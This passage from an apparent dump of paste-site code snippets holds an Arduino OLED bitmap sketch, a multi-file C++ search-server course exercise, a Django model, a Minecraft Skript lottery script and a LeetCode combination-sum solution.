  0x00, 0xf8, 0x7f, 0xe1, 0xf0, 0xf8, 0xfc, 0x00, 0x7c, 0x7f, 0xff, 0xf8, 0x7c, 0x00, 0x1f, 0x00, 
  0x00, 0xf8, 0x7f, 0xc1, 0xf0, 0xf8, 0xfc, 0x00, 0x7c, 0x7f, 0xff, 0xf8, 0x7e, 0x00, 0x3f, 0x00, 
  0x00, 0xf8, 0x3f, 0xc1, 0xf0, 0xf8, 0xff, 0xff, 0xfc, 0x7c, 0x00, 0xfc, 0x7f, 0xff, 0xff, 0x00, 
  0x00, 0xf8, 0x1f, 0x81, 0xf0, 0xf8, 0x7f, 0xff, 0xfc, 0x7c, 0x00, 0x7c, 0x3f, 0xff, 0xff, 0x00, 
  0x00, 0xf8, 0x1f, 0x81, 0xf0, 0xf8, 0x7f, 0xff, 0xf8, 0x7c, 0x00, 0x7c, 0x3f, 0xff, 0xfe, 0x00, 
  0x00, 0xf8, 0x0f, 0x01, 0xf0, 0xf8, 0x1f, 0xff, 0xf0, 0x7c, 0x00, 0x7c, 0x0f, 0xff, 0xfc, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0xff, 0xf0, 0x7f, 0xf8, 0xff, 0xf0, 0x7f, 0xf9, 0xff, 0xf3, 0x87, 0xff, 0x0f, 0xfe, 0x00, 
  0x00, 0xff, 0xf8, 0xff, 0xf8, 0xff, 0xf8, 0xff, 0xfd, 0xff, 0xf3, 0x8f, 0xff, 0x9f, 0xff, 0x00, 
  0x00, 0xff, 0xf9, 0xff, 0xfc, 0xff, 0xf8, 0xff, 0xfc, 0xff, 0xf3, 0x9f, 0xff, 0x9e, 0x0f, 0x00, 
  0x00, 0xe0, 0x39, 0xe0, 0x3c, 0xe0, 0x39, 0xe0, 0x1c, 0x0e, 0x03, 0x9e, 0x03, 0x9c, 0x00, 0x00, 
  0x00, 0xe0, 0x39, 0xe0, 0x1c, 0xff, 0xf9, 0xe0, 0x1c, 0x0e, 0x03, 0x9c, 0x00, 0x1f, 0xfe, 0x00, 
  0x00, 0xff, 0xf9, 0xe0, 0x1c, 0xff, 0xf1, 0xe0, 0x1c, 0x0e, 0x03, 0x9c, 0x00, 0x1f, 0xff, 0x00, 
  0x00, 0xff, 0xf1, 0xe0, 0x1c, 0xf0, 0x39, 0xe0, 0x1c, 0x0e, 0x03, 0x9e, 0x00, 0x01, 0xff, 0x00, 
  0x00, 0xff, 0xf9, 0xe0, 0x3c, 0xe0, 0x3c, 0xe0, 0x3c, 0x0e, 0x03, 0x9e, 0x03, 0x9c, 0x07, 0x00, 
  0x00, 0xe0, 0x39, 0xff, 0xfc, 0xff, 0xfc, 0xff, 0xfc, 0x0e, 0x03, 0x9f, 0xff, 0x9f, 0xff, 0x00, 
  0x00, 0xe0, 0x38, 0xff, 0xf8, 0xff, 0xf8, 0xff, 0xfc, 0x0e, 0x03, 0x8f, 0xff, 0x9f, 0xff, 0x00, 
  0x00, 0xe0, 0x38, 0x7f, 0xf0, 0xff, 0xf0, 0x3f, 0xf0, 0x0e, 0x03, 0x87, 0xfe, 0x0f, 0xfe, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x04, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x03, 0x30, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0xe0, 0x00, 0x00, 0x08, 0x00, 0x03, 0x20, 0x00, 0x00, 
  0x00, 0x00, 0x1f, 0xcf, 0x9e, 0x38, 0x08, 0x80, 0xd8, 0xe2, 0x4f, 0x38, 0xe2, 0x20, 0x00, 0x00, 
  0x00, 0x00, 0x1b, 0xc9, 0x9e, 0x6c, 0x89, 0x88, 0xd9, 0x26, 0xdf, 0x31, 0xb2, 0x22, 0x00, 0x00, 
  0x00, 0x00, 0x1a, 0x59, 0xbc, 0x49, 0x09, 0x98, 0x9b, 0x26, 0xda, 0x39, 0xa6, 0x66, 0x00, 0x00, 
  0x00, 0x00, 0x12, 0x7b, 0xbc, 0xf3, 0x0f, 0x30, 0xff, 0x3c, 0xf2, 0x6f, 0xee, 0xf8, 0x00, 0x00, 
  0x00, 0x00, 0x12, 0xee, 0xf7, 0xbe, 0x0d, 0xe0, 0x5d, 0xf7, 0xe3, 0xfc, 0xfb, 0xf0, 0x00, 0x00, 
  0x00, 0x00, 0x12, 0x04, 0x10, 0x00, 0x00, 0x80, 0x18, 0x80, 0x01, 0x10, 0x02, 0x70, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

void setup() {
  // Initialize with the I2C addr 0x3C (for the 128x64)
  if(!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println(F(""SSD1306 allocation failed""));
    for(;;); // Don't proceed, loop forever
  }

  display.clearDisplay();

  // Draw the bitmap to the screen
  // xpos, ypos, bitmap array, width, height, color
  display.drawBitmap(0, 0, myImage, 128, 64, WHITE);

  // Show the display buffer on the screen
  display.display();
}

void loop() {
  // This is intentionally left blank, or you can add your repetitive code here.
}

"
yHp7PMeJ,СПРИНТ № 5 | Распределение кода по файлам | Делим проект на файлы,chevengur,C++,Wednesday 13th of March 2024 03:02:07 AM CDT,"document.cpp

#include ""document.h""
using namespace std;

std::ostream& operator<<(std::ostream& out, const Document& document) {
    out << ""{ ""s
        << ""document_id = ""s << document.id << "", ""s
        << ""relevance = ""s << document.relevance << "", ""s
        << ""rating = ""s << document.rating << "" }""s;
    return out;
}
***************************************************************************************************************************************

main.cpp

#include <iostream>
#include ""paginator.h""
#include ""read_input_functions.h""
#include ""request_queue.h""
#include ""search_server.h""



int main() {
    setlocale(0, """");
    SearchServer search_server(""and in at""s);
    RequestQueue request_queue(search_server);
    search_server.AddDocument(1, ""curly cat curly tail""s, DocumentStatus::ACTUAL, { 7, 2, 7 });
    search_server.AddDocument(2, ""curly dog and fancy collar""s, DocumentStatus::ACTUAL, { 1, 2, 3 });
    search_server.AddDocument(3, ""big cat fancy collar ""s, DocumentStatus::ACTUAL, { 1, 2, 8 });
    search_server.AddDocument(4, ""big dog sparrow Eugene""s, DocumentStatus::ACTUAL, { 1, 3, 2 });
    search_server.AddDocument(5, ""big dog sparrow Vasiliy""s, DocumentStatus::ACTUAL, { 1, 1, 1 });
    for (int i = 0; i < 1439; ++i) {
        request_queue.AddFindRequest(""empty request""s);
    }

    request_queue.AddFindRequest(""curly dog""s);

    request_queue.AddFindRequest(""big collar""s);

    request_queue.AddFindRequest(""sparrow""s);
    cout << ""Total empty requests: ""s << request_queue.GetNoResultRequests() << endl;
    return 0;
}
***************************************************************************************************************************************

document.h

#pragma once
#include <iostream>

struct Document {
    Document() = default;

    Document(int id, double relevance, int rating)
        : id(id)
        , relevance(relevance)
        , rating(rating) {
    }

    int id = 0;
    double relevance = 0.0;
    int rating = 0;
};

enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

std::ostream& operator<<(std::ostream& out, const Document& document);
***************************************************************************************************************************************

paginator.h

#pragma once
#include <algorithm>
#include <vector>
#include <iostream>

template <typename Iterator>
class IteratorRange {
public:
    IteratorRange(Iterator begin, Iterator end)
        : first_(begin)
        , last_(end)
        , size_(distance(first_, last_)) {
    }

    Iterator begin() const {
        return first_;
    }

    Iterator end() const {
        return last_;
    }

    size_t size() const {
        return size_;
    }

private:
    Iterator first_, last_;
    size_t size_;
};

template <typename Iterator>
std::ostream& operator<<(std::ostream& out, const IteratorRange<Iterator>& range) {
    for (Iterator it = range.begin(); it != range.end(); ++it) {
        out << *it;
    }
    return out;
}

template <typename Iterator>
class Paginator {
public:
    Paginator(Iterator begin, Iterator end, size_t page_size) {
        for (size_t left = distance(begin, end); left > 0;) {
            const size_t current_page_size = std::min(page_size, left);
            const Iterator current_page_end = next(begin, current_page_size);
            pages_.push_back({begin, current_page_end});

            left -= current_page_size;
            begin = current_page_end;
        }
    }

    auto begin() const {
        return pages_.begin();
    }

    auto end() const {
        return pages_.end();
    }

    size_t size() const {
        return pages_.size();
    }

private:
    std::vector<IteratorRange<Iterator>> pages_;
};

template <typename Container>
auto Paginate(const Container& c, size_t page_size) {
    return Paginator(begin(c), end(c), page_size);
}
***************************************************************************************************************************************

read_input_functions.cpp

#include ""read_input_functions.h""


std::string ReadLine()
{
    std::string s;
    getline(std::cin, s);
    return s;
}

int ReadLineWithNumber()
{
    int result;
    std::cin >> result;
    ReadLine();
    return result;
}

***************************************************************************************************************************************

read_input_functions.h

#pragma once
#include <string>
#include <iostream>

std::string ReadLine();

int ReadLineWithNumber();
***************************************************************************************************************************************

request_queue.cpp

#include ""request_queue.h""


RequestQueue::RequestQueue(const SearchServer& search_server) : search_server_(search_server), count_request_(0)
{
}

std::vector<Document> RequestQueue::AddFindRequest(const std::string& raw_query, DocumentStatus status)
{
    const auto result = search_server_.FindTopDocuments(raw_query, status);
    AddRequest(result.size());
    return result;
}

std::vector<Document> RequestQueue::AddFindRequest(const std::string& raw_query)
{
    const auto result = search_server_.FindTopDocuments(raw_query);
    AddRequest(result.size());
    return result;
}

int RequestQueue::GetNoResultRequests() const
{
    return min_in_day_ - count_request_;
}

void RequestQueue::AddRequest(int num_request)
{
    if (num_request != 0)
    {
        ++current_time_;
        ++count_request_;
        requests_.push_back({ num_request, current_time_ });
    }
}
***************************************************************************************************************************************

request_queue.h

#pragma once

#include <string>
#include <vector>
#include <deque>
#include ""search_server.h""
#include ""document.h""

class RequestQueue {
public:
    explicit RequestQueue(const SearchServer& search_server);

    template <typename DocumentPredicate>
    std::vector<Document> AddFindRequest(const std::string& raw_query, DocumentPredicate document_predicate);
    std::vector<Document> AddFindRequest(const std::string& raw_query, DocumentStatus status);
    std::vector<Document> AddFindRequest(const std::string& raw_query);
    int GetNoResultRequests() const;

private:
    struct QueryResult {
        int req;
        uint64_t timestamp;
    };
    std::deque<QueryResult> requests_;
    const SearchServer& search_server_;
    int count_request_ = 0;
    uint64_t current_time_ = 0;
    const static int min_in_day_ = 1440;


    void AddRequest(int num_request);
        
};

template<typename DocumentPredicate>
inline std::vector<Document> RequestQueue::AddFindRequest(const std::string& raw_query, DocumentPredicate document_predicate)
{
    const auto result = search_server_.FindTopDocuments(raw_query, document_predicate);
    AddRequest(result.size());
    return result;
}

***************************************************************************************************************************************

search_server.cpp

#include ""search_server.h""

SearchServer::SearchServer(const string& stop_words_text) : SearchServer(SplitIntoWords(stop_words_text))  // Invoke delegating constructor
// from string container
{
}

void SearchServer::AddDocument(int document_id, const string& document, DocumentStatus status, const vector<int>& ratings)
{
    if ((document_id < 0) || (documents_.count(document_id) > 0)) {
        throw invalid_argument(""Invalid document_id""s);
    }
    const auto words = SplitIntoWordsNoStop(document);

    const double inv_word_count = 1.0 / words.size();
    for (const string& word : words) {
        word_to_document_freqs_[word][document_id] += inv_word_count;
    }
    documents_.emplace(document_id, DocumentData{ ComputeAverageRating(ratings), status });
    document_ids_.push_back(document_id);
}

vector<Document> SearchServer::FindTopDocuments(const string& raw_query, DocumentStatus status) const
{
    return FindTopDocuments(raw_query, [status](int document_id, DocumentStatus document_status, int rating) {
        return document_status == status;
        });
}

vector<Document> SearchServer::FindTopDocuments(const string& raw_query) const
{
    return FindTopDocuments(raw_query, DocumentStatus::ACTUAL);
}

int SearchServer::GetDocumentCount() const
{
    return documents_.size();
}

int SearchServer::GetDocumentId(int index) const {
    return document_ids_.at(index);
}

tuple<vector<string>, DocumentStatus> SearchServer::MatchDocument(const string& raw_query, int document_id) const {
    const auto query = ParseQuery(raw_query);

    vector<string> matched_words;
    for (const string& word : query.plus_words) {
        if (word_to_document_freqs_.count(word) == 0) {
            continue;
        }
        if (word_to_document_freqs_.at(word).count(document_id)) {
            matched_words.push_back(word);
        }
    }
    for (const string& word : query.minus_words) {
        if (word_to_document_freqs_.count(word) == 0) {
            continue;
        }
        if (word_to_document_freqs_.at(word).count(document_id)) {
            matched_words.clear();
            break;
        }
    }
    return { matched_words, documents_.at(document_id).status };
}

vector<string> SearchServer::SplitIntoWordsNoStop(const string& text) const {
    vector<string> words;
    for (const string& word : SplitIntoWords(text)) {
        if (!IsValidWord(word)) {
            throw invalid_argument(""Word ""s + word + "" is invalid""s);
        }
        if (!IsStopWord(word)) {
            words.push_back(word);
        }
    }
    return words;
}

int SearchServer::ComputeAverageRating(const vector<int>& ratings) {
    if (ratings.empty()) {
        return 0;
    }
    int rating_sum = 0;
    for (const int rating : ratings) {
        rating_sum += rating;
    }
    return rating_sum / static_cast<int>(ratings.size());
}

SearchServer::QueryWord SearchServer::ParseQueryWord(const string& text) const
{
    if (text.empty()) {
        throw invalid_argument(""Query word is empty""s);
    }
    string word = text;
    bool is_minus = false;
    if (word[0] == '-') {
        is_minus = true;
        word = word.substr(1);
    }
    if (word.empty() || word[0] == '-' || !IsValidWord(word)) {
        throw invalid_argument(""Query word ""s + text + "" is invalid"");
    }

    return { word, is_minus, IsStopWord(word) };
}


bool SearchServer::IsValidWord(const string& word) {
    // A valid word must not contain special characters
    return none_of(word.begin(), word.end(), [](char c) {
        return c >= '\0' && c < ' ';
        });
}



SearchServer::Query SearchServer::ParseQuery(const string& text) const {
    Query result;
    for (const string& word : SplitIntoWords(text)) {
        const auto query_word = ParseQueryWord(word);
        if (!query_word.is_stop) {
            if (query_word.is_minus) {
                result.minus_words.insert(query_word.data);
            }
            else {
                result.plus_words.insert(query_word.data);
            }
        }
    }
    return result;
}

// Existence required
double SearchServer::ComputeWordInverseDocumentFreq(const string& word) const {
    return log(GetDocumentCount() * 1.0 / word_to_document_freqs_.at(word).size());
}
***************************************************************************************************************************************

search_server.h

#pragma once
#include <algorithm>
#include <map>
#include <vector>
#include <cmath>
#include ""read_input_functions.h""
#include ""string_processing.h""
#include ""document.h""

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

class SearchServer {
public:
    template <typename StringContainer>
    explicit SearchServer(const StringContainer& stop_words);
  
    explicit SearchServer(const string& stop_words_text);
        

    void AddDocument(int document_id, const string& document, DocumentStatus status, const vector<int>& ratings);

    template <typename DocumentPredicate>
    vector<Document> FindTopDocuments(const string& raw_query, DocumentPredicate document_predicate) const;

    vector<Document> FindTopDocuments(const string& raw_query, DocumentStatus status) const;

    vector<Document> FindTopDocuments(const string& raw_query) const;

    int GetDocumentCount() const;

    int GetDocumentId(int index) const;

    tuple<vector<string>, DocumentStatus> MatchDocument(const string& raw_query, int document_id) const;

private:
    struct DocumentData {
        int rating;
        DocumentStatus status;
    };
    const set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;
    vector<int> document_ids_;

    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    static bool IsValidWord(const string& word);

    vector<string> SplitIntoWordsNoStop(const string& text) const;

    static int ComputeAverageRating(const vector<int>& ratings);

    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    QueryWord ParseQueryWord(const string& text) const;

    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };

    Query ParseQuery(const string& text) const;

    // Existence required
    double ComputeWordInverseDocumentFreq(const string& word) const;

    template <typename DocumentPredicate>
    vector<Document> FindAllDocuments(const Query& query, DocumentPredicate document_predicate) const;
};





template<typename StringContainer>
inline SearchServer::SearchServer(const StringContainer& stop_words)
    : stop_words_(MakeUniqueNonEmptyStrings(stop_words))  // Extract non-empty stop words
{
    if (!all_of(stop_words_.begin(), stop_words_.end(), IsValidWord)) {
        throw invalid_argument(""Some of stop words are invalid""s);
    }
}

template<typename DocumentPredicate>
inline vector<Document> SearchServer::FindTopDocuments(const string& raw_query, DocumentPredicate document_predicate) const
{
    const auto query = ParseQuery(raw_query);

    auto matched_documents = FindAllDocuments(query, document_predicate);

    sort(matched_documents.begin(), matched_documents.end(), [](const Document& lhs, const Document& rhs) {
        if (abs(lhs.relevance - rhs.relevance) < 1e-6) {
            return lhs.rating > rhs.rating;
        }
        else {
            return lhs.relevance > rhs.relevance;
        }
        });
    if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
        matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
    }

    return matched_documents;
}

template<typename DocumentPredicate>
inline vector<Document> SearchServer::FindAllDocuments(const Query& query, DocumentPredicate document_predicate) const
{
    map<int, double> document_to_relevance;
    for (const string& word : query.plus_words) {
        if (word_to_document_freqs_.count(word) == 0) {
            continue;
        }
        const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
        for (const auto& [document_id, term_freq] : word_to_document_freqs_.at(word)) {
            const auto& document_data = documents_.at(document_id);
            if (document_predicate(document_id, document_data.status, document_data.rating)) {
                document_to_relevance[document_id] += term_freq * inverse_document_freq;
            }
        }
    }

    for (const string& word : query.minus_words) {
        if (word_to_document_freqs_.count(word) == 0) {
            continue;
        }
        for (const auto& [document_id, _] : word_to_document_freqs_.at(word)) {
            document_to_relevance.erase(document_id);
        }
    }

    vector<Document> matched_documents;
    for (const auto& [document_id, relevance] : document_to_relevance) {
        matched_documents.push_back({ document_id, relevance, documents_.at(document_id).rating });
    }
    return matched_documents;
}
***************************************************************************************************************************************

string_processing.cpp

#include ""string_processing.h""


std::vector<std::string> SplitIntoWords(const std::string& text)
{
    std::vector<std::string> words;
    std::string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        }
        else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}
***************************************************************************************************************************************

string_processing.h

#pragma once
#include <string>
#include <vector>
#include <set>

std::vector<std::string> SplitIntoWords(const std::string& text);

template <typename StringContainer>
std::set<std::string> MakeUniqueNonEmptyStrings(const StringContainer& strings) {
    std::set<std::string> non_empty_strings;
    for (const std::string& str : strings) {
        if (!str.empty()) {
            non_empty_strings.insert(str);
        }
    }
    return non_empty_strings;
}
"
0kZzR8wL,project,horozov86,Python,Wednesday 13th of March 2024 01:21:09 AM CDT,"from django.contrib.auth.models import User
from django.db import models


class Place(models.Model):
    RATING_CHOICES = [
        (1, '1 Star'),
        (2, '2 Stars'),
        (3, '3 Stars'),
        (4, '4 Stars'),
        (5, '5 Stars'),
    ]

    CATEGORY_CHOICES = [
        ('Mountain', 'Mountain'),
        ('Sea', 'Sea'),
        ('Historical Site', 'Historical Site'),
        ('City', 'City'),
        ('Spa', 'Spa'),
        ('Wine Tourism', 'Wine Tourism')

    ]
    name = models.CharField(
        max_length=200,
        null=False,
        blank=False,
    )
    description = models.TextField(
        null=False,
        blank=False,
    )
    location = models.CharField(
        max_length=200,
        null=False,
        blank=False,
    )
    rating = models.IntegerField(
        choices=RATING_CHOICES,
        null=True,
        blank=True,
    )

    image = models.ImageField(
        upload_to='photos/',
        null=True,
        blank=True,
    )

    category = models.CharField(max_length=100, choices=CATEGORY_CHOICES, null=True, blank=True)


    def __str__(self):
        return self.name
"
yP2kM98j,Untitled,ringo0422,YAML,Wednesday 13th of March 2024 12:50:35 AM CDT,"options:
	prefixs: &c[くじ] &r

on rightclick holding paper:
	name of held item contains ""&e宝くじ""
	remove 1 of held item from player
	add 500 to {bronze.elected}
	message ""{@prefixs} 当選予定額のストック: &6%{bronze.elected}% 円 + 10万円""

	chance of 1%:
		broadcast ""{@prefixs} §r %player% §cさんが§b§n[宝くじ]§r§cを当選しました""
		broadcast ""{@prefixs} §r %player% の当選額: &e&l %{bronze.elected}% 円""
		add {bronze.elected} to player's balance
		set {bronze.elected} to 100000"
TwyKFXpK,39. Combination Sum,bennyfromtheblock,Python,Wednesday 13th of March 2024 12:25:15 AM CDT,"# We don't need a visited set if we traverse the solution in a way that creates no repeated visits to the same combination
# ex. let candidates = [1, 2, 3, 4], target = 5
# possible combinations: (1, 1, 1, 1, 1), (1, 1, 1, 2), (1, 1, 3), ...
# notice how there is no point visiting (1, 1, 2, 1) when we've already been at (1, 1, 1, 2)
# In general, we don't need to look at previous candidates when finding 'neighbors'
# So the problem structure is actually a tree (N-ary tree)
# We can use a ""start"" index in the backtrack function to indicate the smallest index to search from

# TC: O(N^(T/M + 1)) where N is num candidates, T is target, M is min element in candidates.
# Why? The height of the tree is T/M, since that's the longest combo we can form
# maxmal number of nodes in N-ary tree is n^(h + 1)

# SC: T/M, max number of recursions stacks we incur and also max len of combo

class Solution:
    def combinationSum(self, candidates: List[int], target: int) -> List[List[int]]:
        results = []

        def backtrack(remain, combo, start):
            if not remain:
                results.append(combo.copy())
                return
            elif remain < 0:
                return

            for i in range(start, len(candidates)):
                combo.append(candidates[i])
                backtrack(remain - candidates[i], combo, i)
                combo.pop()

        backtrack(target, [], 0)
        return results"
